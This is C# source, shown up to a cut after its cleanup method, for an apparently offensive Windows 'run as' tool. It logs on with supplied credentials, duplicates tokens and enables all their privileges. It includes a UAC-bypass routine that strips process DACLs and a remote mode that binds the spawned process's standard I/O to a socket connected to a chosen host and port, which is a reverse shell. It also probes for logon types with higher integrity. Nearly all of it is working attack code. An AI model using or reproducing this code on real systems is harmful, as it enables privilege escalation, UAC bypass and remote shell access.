using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Principal;
using System.Net;

public class RunEx
{
    private IntPtr socket;
    private IntPtr hErrorWrite;
    private IntPtr hOutputRead;
    private IntPtr hOutputWrite;
    private IntPtr hStdInput;
    private WindowStationDACL stationDaclObj;
    private IntPtr hTokenPreviousImpersonatingThread;
    private uint creationFlags;
    public int ExitCode;

    private string GetProcessFunction(int createProcessFunction){
        if(createProcessFunction == 0)
            return "CreateProcessAsUserW()";
        if(createProcessFunction == 1)
            return "CreateProcessWithTokenW()";
        return "CreateProcessWithLogonW()";
    }

    private bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
    {
        NativeMethods.SECURITY_ATTRIBUTES sa = new NativeMethods.SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = IntPtr.Zero;
        sa.bInheritHandle = true;
        if (NativeMethods.CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)NativeMethods.BUFFER_SIZE_PIPE))
            return true;
        return false;
    }

    private string ReadOutputFromPipe(IntPtr hReadPipe)
    {
        string output = "";
        uint dwBytesRead = 0;
        byte[] buffer = new byte[NativeMethods.BUFFER_SIZE_PIPE];
        if(!NativeMethods.ReadFile(hReadPipe, buffer, NativeMethods.BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
            output += "No output received from the process.\r\n";
        }
        output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
        return output;
    }

    private IntPtr ConnectRemote(string[] remote)
    {
        int port = 0;
        int error = 0;
        string host = remote[0];

        try {
            port = Convert.ToInt32(remote[1]);
        } catch {
            throw new RunExException("Specified port is invalid: " + remote[1]);
        }

        NativeMethods.WSAData data;
        if( NativeMethods.WSAStartup(2 << 8 | 2, out data) != 0 ) {
            error = NativeMethods.WSAGetLastError();
            throw new RunExException(String.Format("WSAStartup failed with error code: {0}", error));
        }

        IntPtr socket = IntPtr.Zero;
        socket = NativeMethods.WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        NativeMethods.SOCKADDR_IN sockinfo = new NativeMethods.SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = BitConverter.ToUInt32(((IPAddress.Parse(host)).GetAddressBytes()), 0);
        sockinfo.sin_port = (short)NativeMethods.htons((ushort)port);

        if ( NativeMethods.connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = NativeMethods.WSAGetLastError();
            throw new RunExException(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }

    private bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate) {
        IntPtr hTokenDuplicateLocal = new IntPtr(0);
        bool result = false;
        // if our main thread was already impersonating remember to restore the previous thread token
        if (WindowsIdentity.GetCurrent(true) != null)
            this.hTokenPreviousImpersonatingThread = WindowsIdentity.GetCurrent(true).Token;
        if (!NativeMethods.DuplicateTokenEx(hToken, NativeMethods.TOKEN_ALL_ACCESS, IntPtr.Zero, NativeMethods.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, NativeMethods.TokenImpersonation, ref hTokenDuplicateLocal))
            throw new RunExException("DuplicateTokenEx", true);
        if(AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        result = NativeMethods.ImpersonateLoggedOnUser(hTokenDuplicateLocal);
        hTokenDuplicate = hTokenDuplicateLocal;
        return result;
    }

    private void RevertToSelfCustom() {
        NativeMethods.RevertToSelf();
        if (this.hTokenPreviousImpersonatingThread != IntPtr.Zero)
            NativeMethods.ImpersonateLoggedOnUser(this.hTokenPreviousImpersonatingThread);
    }

    private void GetUserEnvironmentBlock(IntPtr hToken, string username, bool forceProfileCreation, bool userProfileExists, out IntPtr lpEnvironment)
    {
        bool result = false;
        lpEnvironment = new IntPtr(0);
        NativeMethods.PROFILEINFO profileInfo = new NativeMethods.PROFILEINFO();
        IntPtr hTokenDuplicate;
        if (forceProfileCreation || userProfileExists) {
            profileInfo.dwSize = Marshal.SizeOf(profileInfo);
            profileInfo.lpUserName = username;
            result = NativeMethods.LoadUserProfile(hToken, ref profileInfo);
            if (result == false && Marshal.GetLastWin32Error() == 1314)
                Console.Out.WriteLine("[*] Warning: LoadUserProfile failed due to insufficient permissions");
        }
        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
        try {
            NativeMethods.CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        }
        catch {
            result = false;
        }
        RevertToSelfCustom();
        NativeMethods.CloseHandle(hTokenDuplicate);
        if (result && (forceProfileCreation || userProfileExists)) NativeMethods.UnloadUserProfile(hToken, profileInfo.hProfile);
    }

    private bool IsUserProfileCreated(string username, string password, string domainName, int logonType) {
        RunExMainClass.VerboseLog("Checking if user profile exists for: " + username);
        bool result = false;
        IntPtr hToken = IntPtr.Zero, hTokenDuplicate = IntPtr.Zero;
        int logonProvider = NativeMethods.LOGON32_PROVIDER_DEFAULT;
        if (logonType == NativeMethods.LOGON32_LOGON_NEW_CREDENTIALS) logonProvider = NativeMethods.LOGON32_PROVIDER_WINNT50;
        result = NativeMethods.LogonUser(username, domainName, password, logonType, logonProvider, ref hToken);
        if (result == false)
            throw new RunExException("LogonUser", true);
        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
        try
        {
            int dwSize = 0;
            NativeMethods.GetUserProfileDirectory(hToken, null, ref dwSize);
            StringBuilder profileDir = new StringBuilder(dwSize);
            result = NativeMethods.GetUserProfileDirectory(hToken, profileDir, ref dwSize);
        }
        catch {
            result = false;
        }
        RevertToSelfCustom();
        NativeMethods.CloseHandle(hToken);
        NativeMethods.CloseHandle(hTokenDuplicate);
        return result;
    }

    // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    private bool CreateProcessWithLogonWUacBypass(int logonType, uint logonFlags, string username, string domainName, string password, string processPath, string commandLine, ref NativeMethods.STARTUPINFO startupInfo, out NativeMethods.ProcessInformation processInfo) {
        bool result = false;
        IntPtr hToken = new IntPtr(0);
        if (!NativeMethods.LogonUser(username, domainName, password, logonType, NativeMethods.LOGON32_PROVIDER_DEFAULT, ref hToken))
            throw new RunExException("CreateProcessWithLogonWUacBypass: LogonUser", true);
        // here we set the IL of the new token equal to our current process IL. Needed or seclogon will fail.
        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        // remove acl to our current process. Needed for seclogon
        NativeMethods.SetSecurityInfo((IntPtr)NativeMethods.GetCurrentProcess, NativeMethods.SE_OBJECT_TYPE.SE_KERNEL_OBJECT, (uint)NativeMethods.SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(hToken))
        {
            if (domainName == "") // fixing bugs in seclogon ...
                domainName = ".";
            result = NativeMethods.CreateProcessWithLogonW(username, domainName, password, logonFlags | NativeMethods.LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, this.creationFlags, (UInt32)0, null, ref startupInfo, out processInfo);
        }
        NativeMethods.CloseHandle(hToken);
        return result;
    }

    private string ParseCommonProcessesInCommandline(string commandline) {
        string commandlineRet = commandline;
        string[] args = commandline.Split(' ');
        if (args[0].ToLower() == "cmd" || args[0].ToLower() == "cmd.exe") {
            args[0] = Environment.GetEnvironmentVariable("COMSPEC");
            commandlineRet = string.Join(" ", args);
        }
        if (args[0].ToLower() == "powershell" || args[0].ToLower() == "powershell.exe") {
            args[0] = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\WindowsPowerShell\v1.0\powershell.exe";
            commandlineRet = string.Join(" ", args);
        }
        return commandlineRet;
    }

    private bool IsLimitedUserLogon(IntPtr hToken, string username, string domainName, string password, out int logonTypeNotFiltered) {
        RunExMainClass.VerboseLog("Checking if user logon is UAC-limited");
        bool isLimitedUserLogon = false;
        bool isTokenUACFiltered = false;
        IntPtr hTokenNetwork = IntPtr.Zero;
        IntPtr hTokenBatch = IntPtr.Zero;
        IntPtr hTokenService = IntPtr.Zero;
        logonTypeNotFiltered = 0;
        isTokenUACFiltered = AccessToken.IsFilteredUACToken(hToken);
        RunExMainClass.VerboseLog("Token is UAC-filtered: " + isTokenUACFiltered);
        if (isTokenUACFiltered)
        {
            logonTypeNotFiltered = NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT;
            isLimitedUserLogon = true;
        }
        else {
            // Check differences between the requested logon type and non-filtered logon types (Network, Batch, Service)
            // If IL mismatch, the user has potentially more privileges than the requested logon
            AccessToken.IntegrityLevel userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken);
            if (NativeMethods.LogonUser(username, domainName, password, NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT, NativeMethods.LOGON32_PROVIDER_DEFAULT, ref hTokenNetwork) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenNetwork))
            {
                isLimitedUserLogon = true;
                logonTypeNotFiltered = NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT;
            }
            else if (!isLimitedUserLogon && NativeMethods.LogonUser(username, domainName, password, NativeMethods.LOGON32_LOGON_SERVICE, NativeMethods.LOGON32_PROVIDER_DEFAULT, ref hTokenService) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenService))
            {
                // we check Service logon because by default it has the SeImpersonate privilege, available only in High IL
                isLimitedUserLogon = true;
                logonTypeNotFiltered = NativeMethods.LOGON32_LOGON_SERVICE;
            }
            else if (!isLimitedUserLogon && NativeMethods.LogonUser(username, domainName, password, NativeMethods.LOGON32_LOGON_BATCH, NativeMethods.LOGON32_PROVIDER_DEFAULT, ref hTokenBatch) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenBatch))
            {
                isLimitedUserLogon = true;
                logonTypeNotFiltered = NativeMethods.LOGON32_LOGON_BATCH;
            }
            if (hTokenNetwork != IntPtr.Zero) NativeMethods.CloseHandle(hTokenNetwork);
            if (hTokenBatch != IntPtr.Zero) NativeMethods.CloseHandle(hTokenBatch);
            if (hTokenService != IntPtr.Zero) NativeMethods.CloseHandle(hTokenService);
        }
        RunExMainClass.VerboseLog("IsLimitedUserLogon result: " + isLimitedUserLogon);
        return isLimitedUserLogon;
    }

    private void CheckAvailableUserLogonType(string username, string password, string domainName, int logonType, int logonProvider) {
        IntPtr hTokenCheck1 = IntPtr.Zero;
        if (!NativeMethods.LogonUser(username, domainName, password, logonType, logonProvider, ref hTokenCheck1)) {
            if (Marshal.GetLastWin32Error() == NativeMethods.ERROR_LOGON_TYPE_NOT_GRANTED) {
                int availableLogonType = 0;
                int[] logonTypeTryOrder = new int[] { NativeMethods.LOGON32_LOGON_SERVICE, NativeMethods.LOGON32_LOGON_BATCH, NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT, NativeMethods.LOGON32_LOGON_NETWORK, NativeMethods.LOGON32_LOGON_INTERACTIVE};
                foreach (int logonTypeTry in logonTypeTryOrder)
                {
                    IntPtr hTokenCheck2 = IntPtr.Zero;
                    if (NativeMethods.LogonUser(username, domainName, password, logonTypeTry, logonProvider, ref hTokenCheck2)) {
                        availableLogonType = logonTypeTry;
                        if (AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium)
                        {
                            availableLogonType = logonTypeTry;
                            NativeMethods.CloseHandle(hTokenCheck2);
                            break;
                        }
                    }
                    if (hTokenCheck2 != IntPtr.Zero) NativeMethods.CloseHandle(hTokenCheck2);
                }
                if (availableLogonType != 0)
                    throw new RunExException(String.Format("Selected logon type '{0}' is not granted to the user '{1}'. Use available logon type '{2}'.", logonType, username, availableLogonType.ToString()));
                else
                    throw new RunExException("LogonUser", true);
            }
            throw new RunExException("LogonUser", true);
        }
        if (hTokenCheck1 != IntPtr.Zero) NativeMethods.CloseHandle(hTokenCheck1);
    }

    private void RunasSetupStdHandlesForProcess(uint processTimeout, string[] remote, bool passthrough, ref NativeMethods.STARTUPINFO startupInfo, out IntPtr hOutputWrite, out IntPtr hErrorWrite, out IntPtr hOutputRead, out IntPtr hStdInput, out IntPtr socket) {
        IntPtr hOutputReadTmpLocal = IntPtr.Zero;
        IntPtr hOutputWriteLocal = IntPtr.Zero;
        IntPtr hErrorWriteLocal = IntPtr.Zero;
        IntPtr hOutputReadLocal = IntPtr.Zero;
        IntPtr hStdInputLocal = IntPtr.Zero;
        IntPtr socketLocal = IntPtr.Zero;
        if (passthrough)
        {
            RunExMainClass.VerboseLog("I/O mode: passthrough (inheriting console handles)");
            IntPtr hCurrentProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr rawStdin  = NativeMethods.GetStdHandle(NativeMethods.STD_INPUT_HANDLE);
            IntPtr rawStdout = NativeMethods.GetStdHandle(NativeMethods.STD_OUTPUT_HANDLE);
            IntPtr rawStderr = NativeMethods.GetStdHandle(NativeMethods.STD_ERROR_HANDLE);
            IntPtr INVALID_HANDLE = new IntPtr(-1);
            RunExMainClass.VerboseLog(String.Format("GetStdHandle: stdin=0x{0:X}, stdout=0x{1:X}, stderr=0x{2:X}", rawStdin.ToInt64(), rawStdout.ToInt64(), rawStderr.ToInt64()));
            if (rawStdout == IntPtr.Zero || rawStdout == INVALID_HANDLE)
                throw new RunExException("Passthrough requires valid standard handles. No console attached (service session or redirected I/O). Use pipe mode (default) instead.");
            IntPtr hStdin, hStdout, hStderr;
            if (rawStdin == IntPtr.Zero || rawStdin == INVALID_HANDLE) {
                RunExMainClass.VerboseLog("stdin handle is invalid, skipping stdin passthrough");
                hStdin = IntPtr.Zero;
            } else {
                if (!NativeMethods.DuplicateHandle(hCurrentProcess, rawStdin, hCurrentProcess, out hStdin, 0, true, NativeMethods.DUPLICATE_SAME_ACCESS))
                    throw new RunExException("DuplicateHandle stdin", true);
            }
            if (!NativeMethods.DuplicateHandle(hCurrentProcess, rawStdout, hCurrentProcess, out hStdout, 0, true, NativeMethods.DUPLICATE_SAME_ACCESS))
                throw new RunExException("DuplicateHandle stdout", true);
            if (rawStderr == IntPtr.Zero || rawStderr == INVALID_HANDLE) {
                RunExMainClass.VerboseLog("stderr handle same issue as stdin, reusing stdout");
                hStderr = hStdout;
            } else {
                if (!NativeMethods.DuplicateHandle(hCurrentProcess, rawStderr, hCurrentProcess, out hStderr, 0, true, NativeMethods.DUPLICATE_SAME_ACCESS))
                    throw new RunExException("DuplicateHandle stderr", true);
            }
            startupInfo.dwFlags = NativeMethods.Startf_UseStdHandles;
            startupInfo.hStdInput = hStdin;
            startupInfo.hStdOutput = hStdout;
            startupInfo.hStdError = hStderr;
            hStdInputLocal = hStdin;
            hOutputWriteLocal = hStdout;
            hErrorWriteLocal = hStderr;
        }
        else if (processTimeout > 0)
        {
            RunExMainClass.VerboseLog("I/O mode: pipe (capturing output)");
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
            if (!CreateAnonymousPipeEveryoneAccess(ref hOutputReadTmpLocal, ref hOutputWriteLocal))
                throw new RunExException("CreatePipe", true);
            if (!NativeMethods.DuplicateHandle(hCurrentProcess, hOutputWriteLocal, hCurrentProcess, out hErrorWriteLocal, 0, true, NativeMethods.DUPLICATE_SAME_ACCESS))
                throw new RunExException("DuplicateHandle stderr write pipe", true);
            if (!NativeMethods.DuplicateHandle(hCurrentProcess, hOutputReadTmpLocal, hCurrentProcess, out hOutputReadLocal, 0, false, NativeMethods.DUPLICATE_SAME_ACCESS))
                throw new RunExException("DuplicateHandle stdout read pipe", true);
            NativeMethods.CloseHandle(hOutputReadTmpLocal);
            hOutputReadTmpLocal = IntPtr.Zero;
            UInt32 PIPE_NOWAIT = 0x00000001;
            if (!NativeMethods.SetNamedPipeHandleState(hOutputReadLocal, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero))
                throw new RunExException("SetNamedPipeHandleState", true);
            startupInfo.dwFlags = NativeMethods.Startf_UseStdHandles;
            startupInfo.hStdOutput = hOutputWriteLocal;
            startupInfo.hStdError = hErrorWriteLocal;
        }
        else if (remote != null)
        {
            RunExMainClass.VerboseLog("I/O mode: socket (remote " + remote[0] + ":" + remote[1] + ")");
            socketLocal = ConnectRemote(remote);
            startupInfo.dwFlags = NativeMethods.Startf_UseStdHandles;
            startupInfo.hStdInput = socketLocal;
            startupInfo.hStdOutput = socketLocal;
            startupInfo.hStdError = socketLocal;
        }
        hOutputWrite = hOutputWriteLocal;
        hErrorWrite = hErrorWriteLocal;
        hOutputRead = hOutputReadLocal;
        hStdInput = hStdInputLocal;
        socket = socketLocal;
    }

    private void RunasRemoteImpersonation(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, ref NativeMethods.STARTUPINFO startupInfo, ref NativeMethods.ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDupImpersonation = IntPtr.Zero;
        IntPtr lpEnvironment = IntPtr.Zero;
        RunExMainClass.VerboseLog("RemoteImpersonation: calling LogonUser");
        if (!NativeMethods.LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunExException("LogonUser", true);
        RunExMainClass.VerboseLog("RemoteImpersonation: LogonUser succeeded");
        if (IsLimitedUserLogon(hToken, username, domainName, password, out logonTypeNotFiltered))
            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        RunExMainClass.VerboseLog("RemoteImpersonation: duplicating token for impersonation");
        if (!NativeMethods.DuplicateTokenEx(hToken, NativeMethods.TOKEN_ALL_ACCESS, IntPtr.Zero, NativeMethods.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, NativeMethods.TokenImpersonation, ref hTokenDupImpersonation))
            throw new RunExException("DuplicateTokenEx", true);
        if (AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation))
            AccessToken.SetTokenIntegrityLevel(hTokenDupImpersonation, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        // enable all privileges assigned to the token
        AccessToken.EnableAllPrivileges(hTokenDupImpersonation);
        NativeMethods.CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        RunExMainClass.VerboseLog("RemoteImpersonation: creating suspended process");
        if (!NativeMethods.CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, this.creationFlags | NativeMethods.CREATE_SUSPENDED | NativeMethods.CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo))
            throw new RunExException("CreateProcess", true);
        IntPtr hTokenProcess = IntPtr.Zero;
        if (!NativeMethods.OpenProcessToken(processInfo.process, NativeMethods.TOKEN_ALL_ACCESS, out hTokenProcess))
            throw new RunExException("OpenProcessToken", true);
        AccessToken.SetTokenIntegrityLevel(hTokenProcess, AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation));
        // this will solve some permissions errors when attempting to get the current process handle while impersonating
        NativeMethods.SetSecurityInfo(processInfo.process, NativeMethods.SE_OBJECT_TYPE.SE_KERNEL_OBJECT, (uint)NativeMethods.SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        // this will solve some issues, e.g. Access Denied errors when running whoami.exe
        NativeMethods.SetSecurityInfo(hTokenProcess, NativeMethods.SE_OBJECT_TYPE.SE_KERNEL_OBJECT, (uint)NativeMethods.SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        RunExMainClass.VerboseLog("RemoteImpersonation: setting thread token");
        if (!NativeMethods.SetThreadToken(ref processInfo.thread, hTokenDupImpersonation))
            throw new RunExException("SetThreadToken", true);
        RunExMainClass.VerboseLog("RemoteImpersonation: resuming thread");
        NativeMethods.ResumeThread(processInfo.thread);
        NativeMethods.CloseHandle(hToken);
        NativeMethods.CloseHandle(hTokenDupImpersonation);
        NativeMethods.CloseHandle(hTokenProcess);
        if (lpEnvironment != IntPtr.Zero) NativeMethods.DestroyEnvironmentBlock(lpEnvironment);
    }

    private void RunasCreateProcessWithLogonW(string username, string domainName, string password, int logonType, uint logonFlags, string commandLine, bool bypassUac, ref NativeMethods.STARTUPINFO startupInfo, ref NativeMethods.ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        if (logonType == NativeMethods.LOGON32_LOGON_NEW_CREDENTIALS)
        {
            RunExMainClass.VerboseLog("CreateProcessWithLogonW: using NewCredentials (logon type 9) path");
            if (!NativeMethods.CreateProcessWithLogonW(username, domainName, password, NativeMethods.LOGON_NETCREDENTIALS_ONLY, null, commandLine, this.creationFlags, (UInt32)0, null, ref startupInfo, out processInfo))
                throw new RunExException("CreateProcessWithLogonW logon type 9", true);
        }
        else if (bypassUac)
        {
            RunExMainClass.VerboseLog("CreateProcessWithLogonW: using UAC bypass path");
            int logonTypeBypassUac;
            // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
            if (logonType == NativeMethods.LOGON32_LOGON_NETWORK || logonType == NativeMethods.LOGON32_LOGON_BATCH || logonType == NativeMethods.LOGON32_LOGON_SERVICE || logonType == NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT)
                logonTypeBypassUac = logonType;
            else
            {
                logonTypeBypassUac = NativeMethods.LOGON32_LOGON_NETWORK_CLEARTEXT;
            }
            if (!CreateProcessWithLogonWUacBypass(logonTypeBypassUac, logonFlags, username, domainName, password, null, commandLine, ref startupInfo, out processInfo))
                throw new RunExException("CreateProcessWithLogonWUacBypass", true);
        }
        else
        {
            RunExMainClass.VerboseLog("CreateProcessWithLogonW: using standard path");
            IntPtr hTokenUacCheck = new IntPtr(0);
            if (logonType != NativeMethods.LOGON32_LOGON_INTERACTIVE)
                Console.Out.WriteLine("[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '" + logonType.ToString() + "'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --impersonate and --logon-type.");
            // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
            CheckAvailableUserLogonType(username, password, domainName, NativeMethods.LOGON32_LOGON_INTERACTIVE, NativeMethods.LOGON32_PROVIDER_DEFAULT);
            // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon
            RunExMainClass.VerboseLog("CreateProcessWithLogonW: calling LogonUser for UAC check");
            if (!NativeMethods.LogonUser(username, domainName, password, NativeMethods.LOGON32_LOGON_INTERACTIVE, NativeMethods.LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck))
                throw new RunExException("LogonUser", true);
            RunExMainClass.VerboseLog("CreateProcessWithLogonW: checking if user logon is limited");
            if (IsLimitedUserLogon(hTokenUacCheck, username, domainName, password, out logonTypeNotFiltered))
                Console.Out.WriteLine(String.Format("[*] Warning: The logon for user '{0}' is limited. Use the flag combination --bypass-uac and --logon-type '{1}' to obtain a more privileged token.", username, logonTypeNotFiltered));
            NativeMethods.CloseHandle(hTokenUacCheck);
            if (!NativeMethods.CreateProcessWithLogonW(username, domainName, password, logonFlags, null, commandLine, this.creationFlags, (UInt32)0, null, ref startupInfo, out processInfo))
                throw new RunExException("CreateProcessWithLogonW logon type 2", true);
        }
    }

    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref NativeMethods.STARTUPINFO startupInfo, ref NativeMethods.ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDuplicate = IntPtr.Zero;
        RunExMainClass.VerboseLog("CreateProcessWithTokenW: calling LogonUser");
        if (!NativeMethods.LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunExException("LogonUser", true);
        RunExMainClass.VerboseLog("CreateProcessWithTokenW: duplicating token as primary");
        if (!NativeMethods.DuplicateTokenEx(hToken, NativeMethods.TOKEN_ALL_ACCESS, IntPtr.Zero, NativeMethods.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, NativeMethods.TokenPrimary, ref hTokenDuplicate))
            throw new RunExException("DuplicateTokenEx", true);
        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        // Enable SeImpersonatePrivilege on our current process needed by the seclogon to make the CreateProcessWithTokenW call
        RunExMainClass.VerboseLog("CreateProcessWithTokenW: enabling SeImpersonatePrivilege");
        AccessToken.EnablePrivilege("SeImpersonatePrivilege", WindowsIdentity.GetCurrent().Token);
        // Enable all privileges for the token of the new process
        RunExMainClass.VerboseLog("CreateProcessWithTokenW: enabling all privileges on new token");
        AccessToken.EnableAllPrivileges(hTokenDuplicate);
        RunExMainClass.VerboseLog("CreateProcessWithTokenW: creating process");
        if (!NativeMethods.CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, this.creationFlags, IntPtr.Zero, null, ref startupInfo, out processInfo))
            throw new RunExException("CreateProcessWithTokenW", true);
        NativeMethods.CloseHandle(hToken);
        NativeMethods.CloseHandle(hTokenDuplicate);
    }

    private void RunasCreateProcessAsUserW(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, bool forceUserProfileCreation, bool userProfileExists, ref NativeMethods.STARTUPINFO startupInfo, ref NativeMethods.ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDuplicate = IntPtr.Zero;
        IntPtr lpEnvironment = IntPtr.Zero;
        RunExMainClass.VerboseLog("CreateProcessAsUserW: calling LogonUser");
        if (!NativeMethods.LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunExException("LogonUser", true);
        RunExMainClass.VerboseLog("CreateProcessAsUserW: duplicating token as primary");
        if (!NativeMethods.DuplicateTokenEx(hToken, NativeMethods.TOKEN_ALL_ACCESS, IntPtr.Zero, NativeMethods.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, NativeMethods.TokenPrimary, ref hTokenDuplicate))
            throw new RunExException("DuplicateTokenEx", true);
        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        RunExMainClass.VerboseLog("CreateProcessAsUserW: loading user environment block");
        GetUserEnvironmentBlock(hTokenDuplicate, username, forceUserProfileCreation, userProfileExists, out lpEnvironment);
        // Enable SeAssignPrimaryTokenPrivilege on our current process needed by the kernel to make the CreateProcessAsUserW call
        RunExMainClass.VerboseLog("CreateProcessAsUserW: enabling SeAssignPrimaryTokenPrivilege");
        AccessToken.EnablePrivilege("SeAssignPrimaryTokenPrivilege", WindowsIdentity.GetCurrent().Token);
        // Enable all privileges for the token of the new process
        RunExMainClass.VerboseLog("CreateProcessAsUserW: enabling all privileges on new token");
        AccessToken.EnableAllPrivileges(hTokenDuplicate);
        //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
        RunExMainClass.VerboseLog("CreateProcessAsUserW: creating process");
        if (!NativeMethods.CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, this.creationFlags | NativeMethods.CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo))
            throw new RunExException("CreateProcessAsUser", true);
        if (lpEnvironment != IntPtr.Zero) NativeMethods.DestroyEnvironmentBlock(lpEnvironment);
        NativeMethods.CloseHandle(hToken);
        NativeMethods.CloseHandle(hTokenDuplicate);
    }

    public RunEx()
    {
        this.hOutputRead = new IntPtr(0);
        this.hOutputWrite = new IntPtr(0);
        this.hErrorWrite = new IntPtr(0);
        this.hStdInput = new IntPtr(0);
        this.socket = new IntPtr(0);
        this.stationDaclObj = null;
        this.hTokenPreviousImpersonatingThread = new IntPtr(0);
        this.creationFlags = NativeMethods.CREATE_NO_WINDOW;
        this.ExitCode = 0;
    }

    public void CleanupHandles()
    {
        if(this.hOutputRead != IntPtr.Zero) NativeMethods.CloseHandle(this.hOutputRead);
        if(this.hOutputWrite != IntPtr.Zero) NativeMethods.CloseHandle(this.hOutputWrite);
        if(this.hErrorWrite != IntPtr.Zero) NativeMethods.CloseHandle(this.hErrorWrite);
        if(this.hStdInput != IntPtr.Zero) NativeMethods.CloseHandle(this.hStdInput);
        if(this.socket != IntPtr.Zero) NativeMethods.closesocket(this.socket);
        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
        this.hOutputRead = IntPtr.Zero;
        this.hOutputWrite = IntPtr.Zero;
        this.hErrorWrite = IntPtr.Zero;
        this.hStdInput = IntPtr.Zero;
        this.socket = IntPtr.Zero;
        this.hTokenPreviousImpersonatingThread = IntPtr.Zero;
        this.stationDaclObj = null;
    }

